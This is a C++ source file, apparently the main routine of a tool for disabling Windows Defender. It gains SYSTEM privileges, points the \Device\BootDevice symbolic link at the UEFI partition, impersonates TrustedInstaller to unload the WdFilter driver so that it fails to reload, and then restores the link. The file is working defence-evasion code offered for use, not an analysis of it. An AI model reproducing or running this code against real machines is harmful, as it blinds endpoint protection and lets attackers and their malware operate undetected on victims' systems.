#include "common.h"

int main()
{
	// let's get SYSTEM, shall we? ;)
	auto success = GetSystem();
	if (!success)
	{
		std::cout << "[-] Not enough privileges to elevate to SYSTEM, exiting...\n";
		return 1;
	}

	// save the old symbolic link so that we can restore it later
	auto oldTarget = GetSymbolicLinkTarget(L"\\Device\\BootDevice");

	// change the symbolic link to make it point to the UEFI partition (\Device\HarddiskVolume1)
	auto status = ChangeSymlink(L"\\Device\\BootDevice", L"\\Device\\HarddiskVolume1");
	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully changed symbolic link to new target!\n";
	else
	{
		Error(RtlNtStatusToDosError(status));
		std::cout << "[-] Failed to change symbolic link, exiting...\n";
		return 1;
	}

	// start a sacrificial thread that will impersonate TrustedInstaller and unload Wdfilter while the symlink is changed
	std::thread driverKillerThread(ImpersonateAndUnload);
	driverKillerThread.join();
	
	std::cout << "[+] Sleeping 10 seconds to let the driver \"reload\" ;)\n";
	Sleep(10000);

	// restore the symlink
	status = ChangeSymlink(L"\\Device\\BootDevice", oldTarget);
	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully restored symbolic links...\n";
	else
	{
		Error(RtlNtStatusToDosError(status));
		std::cout << "[-] Failed to restore symbolic links, fix them manually!!\n";
		return 1;
	}
	
	return 0;
}
